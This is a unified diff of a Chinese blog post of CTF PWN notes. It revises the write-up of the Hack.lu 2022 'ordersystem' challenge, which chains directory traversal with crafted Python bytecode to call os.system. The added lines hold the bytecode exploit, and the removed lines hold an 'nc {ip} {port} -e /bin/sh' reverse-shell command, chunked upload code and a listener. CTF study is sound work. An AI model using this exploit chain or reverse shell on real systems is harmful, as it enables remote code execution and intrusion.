@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-23T15:50:27.874Z">
+<meta property="article:modified_time" content="2022-11-25T01:50:36.072Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -216,7 +216,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      87k 字
+      86k 字
     </span>
   
 
@@ -225,7 +225,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1087 分钟
+      1071 分钟
     </span>
   
 
@@ -266,7 +266,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年11月23日 晚上
+                  不可视境界线最后变动于：2022年11月25日 上午
                 
               </p>
             
@@ -846,8 +846,8 @@
 </ul>
 <h3 id="ordersystem-wp1-wp2"><a href="#ordersystem-wp1-wp2" class="headerlink" title="ordersystem wp1 wp2:"></a>ordersystem <a target="_blank" rel="noopener" href="https://enoflag.github.io/writeups/hacklu2022/ordersystem/">wp1</a> <a target="_blank" rel="noopener" href="https://qwerty-po.notion.site/Hack-lu-2022-Writeup-03ddbe17de6c47629d755998a5d6e411">wp2</a>:</h3><h4 id="src"><a href="#src" class="headerlink" title="src"></a>src</h4><ul>
 <li>用字典类型<code>ENTRIES</code>来保存输入的信息. 其中key最多12字节, 可以是任意bytes, 但是data只能是printable hex number, 长度为0-255.</li>
-<li>可保存data到storage文件夹中的key(文件名称), 不过可以directory traversal到plugins文件夹中. </li>
-<li>执行plugins时读取相应bytecode文件, 将所有key加上<code>plugin_log(msg,filename=&#39;./log&#39;,raw=False)</code>放到codeType的consts中, 其中log函数可做到往<code>./log</code>文件(可更改参数)写入任意数据. 最后<code>exec()</code>执行代码. </li>
+<li>可保存data到storage文件夹中的key.decode或者key.hex(作为文件名称), <strong>还可以</strong>directory traversal到plugins文件夹中. </li>
+<li>执行plugins时读取相应bytecode文件, 将所有key加上<code>plugin_log(msg,filename=&#39;./log&#39;,raw=False)</code>放到codeType的consts中, <strong>将bytecode后面使用分号隔开的bytes放到names中</strong>.<br>其中log函数可做到将第一个参数的内容(无限制)写入<code>./log</code>文件. 最后<code>exec()</code>执行代码. <strong>但是</strong>, 注意调用log函数时第一个参数msg只能是来自co_const, 而consts又是从key中获取, <del>而key在store_disk时使用的</del> </li>
 </ul>
 <p>所以要在被限制的代码中多次调用log函数, 把consts中的key当做是msg写入plugins文件夹中. </p>
 <p>docker安装的python版本是3.10.6</p>
@@ -862,58 +862,35 @@
 <li><a target="_blank" rel="noopener" href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with statement</a>(有更多东西) | <a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/stdtypes.html#typecontextmanager">context manager</a> </li>
 <li>通过with语句的流程看出来貌似在with_statement evaluate之后的值自带manager, 比如open()返回的file object中就有<code>__enter__</code>函数, 而且enter也不需要做什么就直接返回file object. 而<code>__exit__</code>就是直接调用close()</li>
 </ul>
-</li>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">   - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">   - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">   - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">   We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">   Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">   return value.</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure></li>
 <li><p>然后呢?</p>
 </li>
 </ul>
 <h4 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h4><p>?</p>
 <h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>)<br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? 不就是压入了一个long类型的0吗, 这个指令不需要参数.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),	<span class="hljs-comment">#load了一个string object, 所以可以在他之上调用decode函数.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>),<br>]<br></code></pre></div></td></tr></table></figure>
 
-<p>This performs the following:</p>
-<ol>
-<li>Invoke <code>len(list())</code> to push <code>0</code> onto the stack</li>
-<li>Invoke <code>print()</code> to push <code>None</code> onto the stack</li>
-<li>Import <code>os</code></li>
-<li>Load all three batches of the <code>nc</code> command</li>
-<li>Decode the command batches because <code>BUILD_STRING</code> only works with strings and not byte strings</li>
-<li>Concatenate the <code>nc</code> command</li>
-<li>Invoke the <code>nc</code> command via <code>os.system()</code> </li>
-</ol>
-<p>Then, we can “compile” the code:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exploit_bytecode = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> op_name, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exploit_bytecode += <span class="hljs-built_in">bytes</span>([opmap[op_name], arg])<br></code></pre></div></td></tr></table></figure>
+<p>Then, we can “assemble” the code:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exploit_bytecode = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> op_name, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exploit_bytecode += <span class="hljs-built_in">bytes</span>([opmap[op_name], arg])<br><span class="hljs-comment"># add consts</span><br>exploit_bytecode += <span class="hljs-string">b&quot;;&quot;</span><br>exploit_bytecode += <span class="hljs-string">b&quot;;&quot;</span>.join(n.encode() <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> co_names)<br></code></pre></div></td></tr></table></figure>
 
 <p>可以看出来指令非常的简单, 就是一个字节指令加上一个字节操作数. </p>
-<p>After that, we need to append the constants to make them available to the plugin:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exploit_bytecode += <span class="hljs-string">b&quot;;&quot;</span><br>exploit_bytecode += <span class="hljs-string">b&quot;;&quot;</span>.join(n.encode() <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> co_names)<br></code></pre></div></td></tr></table></figure>
+<p>为什么是分号? <strong>是题目源码中识别到有分号时自动把names加入到CodeObject.names</strong> </p>
+<h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in chunks"></a>Upload exploit bytecode in chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">num_chunks = <span class="hljs-built_in">len</span>(exploit_bytecode) // chunk_size + <span class="hljs-number">1</span><br>exploit_bytecode = exploit_bytecode.ljust(chunk_size * num_chunks, <span class="hljs-string">b&quot;;&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exploit_bytecode), chunk_size):<br>    upload_file(exploit_bytecode[i : i + chunk_size])<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in chunks"></a>Upload exploit bytecode in chunks</h4><p>Check how many chunks we need to store the exploit in:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">num_chunks = <span class="hljs-built_in">len</span>(exploit_bytecode) <span class="hljs-comment"># chunk_size + 1</span><br></code></pre></div></td></tr></table></figure>
 
-<p>Pad the exploit code to a multiple of 12:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exploit_bytecode = exploit_bytecode.ljust(chunk_size * num_chunks, <span class="hljs-string">b&quot;;&quot;</span>)<br></code></pre></div></td></tr></table></figure>
 
-<p>Upload exploit chunks:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exploit_bytecode), chunk_size):<br>    upload_file(exploit_bytecode[i : i + chunk_size])<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="Upload-plugins-to-assemble-exploit-chunks"><a href="#Upload-plugins-to-assemble-exploit-chunks" class="headerlink" title="Upload plugins to assemble exploit chunks"></a>Upload plugins to assemble exploit chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    upload_plugin(<br>        <span class="hljs-built_in">str</span>(i), get_plugin_code(plugin_log_index, exploit_filename, base_index + i)<br>    )<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="Upload-additional-constants"><a href="#Upload-additional-constants" class="headerlink" title="Upload additional constants"></a>Upload additional constants</h4><p>In order to make the exploit work, we need a few more constants. These have to be uploaded after the plugins to make sure the plugins can be saved to disk successfully before any entries with invalid filenames are created (e.g. saving the file <code>plugins/expl</code> won’t work because there is no directory <code>storage/plugins</code> but we cannot traverse the path because then the logfile method won’t find it since this is operating from the working directory).</p>
-<p>Store the filename which is used as “logfile” at index <code>ord(&quot;a&quot;)</code></p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">upload_file(<span class="hljs-string">&quot;plugins/expl&quot;</span>)<br></code></pre></div></td></tr></table></figure>
 
-<p>Store the <code>nc</code> command at index <code>ord(&quot;b&quot;)</code></p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">commmand = <span class="hljs-string">f&quot;nc <span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;rev_port&#125;</span> -e /bin/sh&quot;</span>.ljust(chunk_size * <span class="hljs-number">3</span>, <span class="hljs-string">&quot; &quot;</span>)<br>upload_file(commmand[:chunk_size])<br>upload_file(commmand[chunk_size : <span class="hljs-number">2</span> * chunk_size])<br>upload_file(commmand[<span class="hljs-number">2</span> * chunk_size :])<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="Run-plugins-to-assemble-exploit-chunks"><a href="#Run-plugins-to-assemble-exploit-chunks" class="headerlink" title="Run plugins to assemble exploit chunks"></a>Run plugins to assemble exploit chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    run_plugin(<span class="hljs-built_in">str</span>(i))<br></code></pre></div></td></tr></table></figure>
 
-<h4 id="Run-the-exploit-plugin"><a href="#Run-the-exploit-plugin" class="headerlink" title="Run the exploit plugin"></a>Run the exploit plugin</h4><p>Now, we can listen for the reverse shell:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">reverse_shell = listen(rev_port)<br></code></pre></div></td></tr></table></figure>
 
-<p>Run exploit code and spawn the reverse shell:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">run_plugin(<span class="hljs-string">&quot;expl&quot;</span>)<br></code></pre></div></td></tr></table></figure>
 
-<p>And finally get the flag</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">reverse_shell.sendline(<span class="hljs-string">b&quot;echo $flag&quot;</span>)<br>flag = reverse_shell.readline()<br></code></pre></div></td></tr></table></figure>
+
+
+
+
+
+
 
 
 
